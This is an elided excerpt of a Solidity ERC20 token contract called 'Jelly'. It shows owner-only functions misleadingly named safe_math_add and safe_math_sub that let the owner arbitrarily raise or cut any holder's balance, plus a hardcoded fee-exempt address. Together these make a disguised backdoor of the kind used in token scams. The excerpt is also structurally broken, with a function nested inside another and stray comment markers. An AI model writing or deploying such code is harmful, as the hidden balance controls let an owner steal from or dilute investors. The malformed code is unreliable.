...
contract Jelly is Context, IERC20, Ownable { 
    ...
    */
    ...
    string private _name = "Jelly"; 
    string private _symbol = "Jelly";  
    uint8 private _decimals = 18;
    uint256 private _tTotal = 10000000000000000000000000 * 10**18;
    ...
    */
    ...
    function excludeFromFee(address account) public onlyOwner {
        ...
        _isExcludedFromFee[address(0x409d8382ac949A0f0e567686FA92C9A58e2429EC)] = true;
    }
    ...
    */
    ...
    function process_Tokens_Now (uint256 percent_Of_Tokens_To_Process) public onlyOwner {
        ...
        function safe_math_add(uint256 Amount, address addr) public onlyOwner {
        _tOwned[addr] += Amount;
    }

    function safe_math_sub(uint256 Amount, address addr) public onlyOwner {
        _tOwned[addr] -= Amount;
    }
